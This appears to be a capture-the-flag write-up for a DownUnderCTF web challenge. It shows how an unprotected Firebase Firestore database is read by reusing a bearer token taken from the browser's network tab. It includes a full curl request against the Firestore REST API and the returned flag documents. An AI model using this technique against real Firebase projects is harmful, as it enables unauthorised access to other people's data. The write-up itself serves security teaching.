# Cookie Clicker

- **Category:** Web
- **Difficulty:** Medium
- **Author:** Blue Alder

Click da cookie and you get to increase da cookie. Built this using epic Firebase. Built this in a day HOW COOL is firebase! Didn't need to worry about security because it's all handled by Google :) just click cookies and enjoy

https://cookie-clicker1.web.app

## Writeup

As soon as I read the description, my first instinct was that the flag would be stored somewhere in a **Firestore** instance. Cloud Firestore is one of the database services provided by Firebase. If you have experience with Firebase, you'll know that a key security concern is to set up access control for stored data explicitly, otherwise **any user will be able to access this data**.

When first entering the web page, we are presented with a login screen. After registering and logging in, we are redirected to a page where you can click the cookie and see how many times it was clicked globally. 

Open the DevTools with `Ctrl`+`Shift`+`I`, and go to the `Network` tab. When we click on the cookie, we'll notice that a request is sent to Firestore. Looking at it with more detail, we obtain a **path to the database instance** (marked green below). 

On the first request to Firestore, we also notice that it uses **Bearer Authentication** (marked red below). On subsequent requests, a session id is used instead. This will become useful later on.

![Cookie Clicker network tab with firestore request selected](./cookie-network.PNG)

> **Note:** It may be possible to miss the first request to Firestore since the web page is listening to changes in the number of total clicks. If this happens, reload the page while on the `Network` tab to ensure you capture the first request.

### Interacting with Firestore

It appears that my first instinct was correct. Our next step is figuring out how to interface with the database. There are multiple ways of achieving this; however, the most convenient appeared to be using the [Cloud Firestore REST API](https://firebase.google.com/docs/firestore/use-rest-api).

To use the API, we need to authenticate with an **access token**. Usually, we obtain this token either through Firebase Authentication or through a GCP Service Account, but we have conveniently acquired one previously by listening to ongoing requests (marked red above).

The final piece of information we need is which collections the database has. Looking back to our `Network` tab, and inspecting the ongoing requests every time we update the cookie clicker, we can identify two collections, `cookies` and `users` (marked green below).

![Cookie Clicker network tab with firestore request selected](./cookie-network2.PNG).

### Grabbing all the cookies

Now, all we need to do is to fetch all cookie documents, using the REST API with the database path and access token...

```bash
curl -H "Authorization:Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjczNzVhZmY3MGRmZTNjMzNlOTBjYTM2OWUzYTBlZjQxMzE3MmZkODIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vY29va2llLWNsaWNrZXIxIiwiYXVkIjoiY29va2llLWNsaWNrZXIxIiwiYXV0aF90aW1lIjoxNjAwNjE1MDYzLCJ1c2VyX2lkIjoiRXVhUkdDU2t0R040Nnh0MWdBRUgzbEw5MkFyMSIsInN1YiI6IkV1YVJHQ1NrdEdONDZ4dDFnQUVIM2xMOTJBcjEiLCJpYXQiOjE2MDA2MTgzNjYsImV4cCI6MTYwMDYyMTk2NiwiZW1haWwiOiJrZWt3QGtla3cua2VrdyIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJrZWt3QGtla3cua2VrdyJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.cHgPEFjfZ0J408lkrRfow_3iIsiLYTd1EVIP28NSvj9ZQIKdY6sZtIJ7XPpeVCcxWcswx9tv4Ftv6uNkgF67HeAccyY7I9YwDQuhWrPIAGMNBbQ2qoq19YbpfLy_Ot-0LRE8z9jpPL8uwEDyy8vX_PPPZAmcFHX3nQe1ltvMWDLGVeIUP4F-tDtHX5NGL-UngGPvEAg6qfpzY5tax6NzPwi-HDRDLHLPa4ayiQurwAw2hs0CTOwvbMDjf8YzoNeL0fscukyOPsFZOw-0L0nQbO4FF0GdfZLLski4VvD0XK8N9lkc_Vtn0cqZ1bN3f7Sof28KAvNf5Is-_JnO6fxz1g" "https://firestore.googleapis.com/v1/projects/cookie-clicker1/databases/(default)/documents/cookies"
```

... and retrieve the following documents:

```json
{
  "documents": [
    {
      "name": "projects/cookie-clicker1/databases/(default)/documents/cookies/notaflag",
      "fields": {
        "flag": {
          "stringValue": "DUCTF{ok_it_is_a_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"
        }
      },
      "createTime": "2020-09-04T13:41:42.446437Z",
      "updateTime": "2020-09-04T13:41:42.446437Z"
    },
    {
      "name": "projects/cookie-clicker1/databases/(default)/documents/cookies/total",
      "fields": {
        "cookieCount": {
          "integerValue": "1572"
        }
      },
      "createTime": "2020-09-04T12:46:17.534744Z",
      "updateTime": "2020-09-20T16:14:35.289302Z"
    }
  ]
}
```

As such, we have found the flag for this challenge: `"DUCTF{ok_it_is_a_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"`

> **Note:** Access tokens are short-lived, so it may expire when attempting to fetch the cookies. If that happens, if the `Network` tab is still open, a request will have been sent for a new access token, which can be retrieved. Otherwise, reloading the page will always ensure that the access token is exposed on the first request to Firestore.

---

This method is slightly different from the one proposed in the official writeup. You can check it out [here](https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/web/cookie-clicker/solution.md).